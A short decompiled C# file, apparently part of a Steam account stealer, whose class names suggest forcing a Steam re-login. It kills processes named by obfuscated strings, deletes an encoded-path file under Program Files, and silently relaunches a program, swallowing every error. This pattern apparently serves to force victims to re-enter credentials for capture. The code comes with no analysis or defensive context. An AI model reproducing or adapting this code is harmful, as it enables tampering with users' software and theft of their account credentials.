using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class DASteam
{
	public class FRCSTMLGINdll
	{
		public static void Mainz()
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (process.ProcessName.Contains(LOOTCKC.IPNPIWT("rcnFyMYM", "False")) | process.ProcessName.Contains(LOOTCKC.IPNPIWT("aqaipaMv", "False")))
					{
						process.Kill();
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			double KEPDFR = 5.0;
			KVPXNIVH.NOHKJYN(ref KEPDFR);
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + LOOTCKC.IPNPIWT("gpTAuKaTna/Cs4yqs6+YmqatwIaWsZC0uYdvwrerIA==", "False");
				if (File.Exists(path))
				{
					File.Delete(path);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			KEPDFR = 2.0;
			KVPXNIVH.NOHKJYN(ref KEPDFR);
			try
			{
				Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + LOOTCKC.IPNPIWT("fI66sqCNl5nBpIGodLK3hSc=", "False"), (AppWinStyle)2, false, -1);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}
}
